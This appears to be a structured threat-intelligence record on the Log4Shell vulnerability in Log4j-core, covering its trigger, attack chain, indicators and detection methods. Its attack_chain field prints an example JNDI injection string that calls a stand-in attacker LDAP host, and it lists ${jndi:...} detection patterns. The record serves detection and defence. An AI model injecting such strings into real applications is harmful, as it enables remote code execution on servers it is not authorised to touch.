package_info.why_malicious: The affected versions of the Log4j-core package contain a critical vulnerability (CVE-2021-44228, 'Log4Shell') that allows attackers to achieve remote code execution by injecting specially crafted log messages. This is due to unsafe handling of JNDI lookups in log message processing, which enables attackers to cause the application to load and execute arbitrary code from remote servers under their control.

execution_context.trigger: At runtime, when a log message containing a JNDI lookup pattern is processed by Log4j
required_permissions: filesystem (for class loading and resource access)

malicious_snippets.code_language: java (expression in log message, resolved by Log4j)
malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, Log4j interprets the pattern, initiates a JNDI lookup to an attacker-controlled LDAP server, retrieves a remote Java class or serialized object, and loads or executes it within the application process, resulting in remote code execution.

malice_analysis.why_suspicious: This behavior allows untrusted user input in log messages to trigger outbound network requests and load or execute code from arbitrary remote servers, directly enabling remote code execution without authentication or authorization.
malice_analysis.violated_expectations: Logging frameworks are expected to treat log message content as inert data and never interpret or execute code, nor initiate network requests based on untrusted input. The use of JNDI lookups on unsanitized log data violates this core security expectation.
malice_analysis.similar_legitimate_use: JNDI lookups may be used legitimately for internal resource resolution in tightly controlled, trusted environments where all input is sanitized and not user-controlled. However, exposing this functionality to untrusted user input is never legitimate.
key_indicators: Presence of ${jndi:...} patterns in log messages or application logs
Log4j processing triggers outbound LDAP/RMI/CORBA network requests
Dynamic loading or execution of Java classes from remote servers during log processing
No input validation or sanitization on log message content before JNDI resolution

attack_chain.action: Attacker injects a specially crafted string (e.g., ${jndi:ldap://attacker.com/a}) into any field that will be logged by the application, such as HTTP headers, form fields, or user agent strings.
attack_chain.leads_to: Log4j processes the log message and interprets the JNDI lookup pattern.

attack_chain.action: Log4j performs a JNDI lookup to the attacker-controlled LDAP server, retrieves a malicious Java class or serialized object, and loads or executes it within the application process.
attack_chain.leads_to: Remote code execution on the vulnerable server, allowing the attacker to run arbitrary code.

behavioral_signatures: Log message content containing ${jndi:...} patterns, especially with ldap, rmi, or other remote protocols
Unexpected outbound LDAP, RMI, or CORBA network requests originating from Java applications during log processing
Dynamic class loading or deserialization from remote servers triggered by log message content
Log4j-core processing untrusted input without sanitization
file_indicators: Presence of vulnerable Log4j-core versions (2.0-beta9 through 2.14.1) in application dependencies
References to org/apache/logging/log4j/core/lookup/JndiLookup.class in application JARs or classpaths
Application JARs containing JndiLookup.class and lacking security patches (e.g., log4j2.formatMsgNoLookups not set or JndiLookup not removed)
network_indicators: Outbound LDAP, RMI, or CORBA requests to external or untrusted servers from Java processes
Connections to attacker-controlled domains or IPs in the context of log message processing
Unusual network activity from application servers immediately following log events containing suspicious patterns
detection_knowledge.how_to_detect: Monitor application logs for the presence of ${jndi:...} patterns, especially those referencing external servers. Analyze network traffic from Java applications for unexpected outbound LDAP, RMI, or CORBA connections. Scan application dependencies for vulnerable Log4j-core versions and the presence of JndiLookup.class. Use static analysis to identify logging of untrusted input without sanitization. Implement runtime monitoring to detect dynamic class loading from remote sources during log processing.
